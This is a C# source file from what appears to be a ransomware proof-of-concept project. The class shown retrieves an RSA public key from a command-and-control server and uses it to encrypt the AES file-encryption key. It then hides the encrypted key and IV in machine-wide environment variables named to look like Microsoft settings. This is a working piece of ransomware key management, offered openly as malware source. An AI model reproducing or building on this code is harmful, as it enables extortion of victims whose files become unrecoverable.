using System;
using System.Collections.Generic;
using System.Text;
using System.Security.Cryptography;
using Microsoft.Win32;
namespace Ilay_sRanomwarePoc
{
    public static class AsymmetricProtection
    {
        private static Byte[] AesKeyPlaintext;
        private static RSAParameters PublicKey;  //will be retrived from the c&c server
        private const string EnvironmentVariableNameKey = "MicrosoftEssentials";
        private const string EnvironmentVariableNameIV = "MicrsoftInitializationVector";
        static AsymmetricProtection()
        {
            Communication Socket = new Communication();
            PublicKey = RSA.Create().ExportParameters(false);
            PublicKey.Modulus = Socket.ServerHello();//setting the servers public rsa key
            AesKeyPlaintext = AesEncryption.GetEncryptionPublicKey();


        }



        public static Byte[] EncryptDataStream(Byte[] Data)               //method for encrypting th aes key
        {
            try
            {

                RSACryptoServiceProvider Encryptor = new RSACryptoServiceProvider();
                Encryptor.ImportParameters(PublicKey);
                Byte[] Encrypted = Encryptor.Encrypt(Data, true);
                return Encrypted;

            }
            catch
            {
                Console.WriteLine("An Error while encrypting aes key");
                return null;
            }

        }

        public static void ProtectAesEncryptionKey()
        {
            string IV = AesEncryption.ConvertByteToString(AesEncryption.GetAesInitializationVector());
            string Key = AesEncryption.ConvertByteToString(EncryptDataStream(AesKeyPlaintext));//encrypting aes key using servers public key
            Environment.SetEnvironmentVariable(EnvironmentVariableNameKey, Key, EnvironmentVariableTarget.Machine);//saving encrypted key in an environment variable
            Environment.SetEnvironmentVariable(EnvironmentVariableNameIV, IV, EnvironmentVariableTarget.Machine);
        }















    }
}
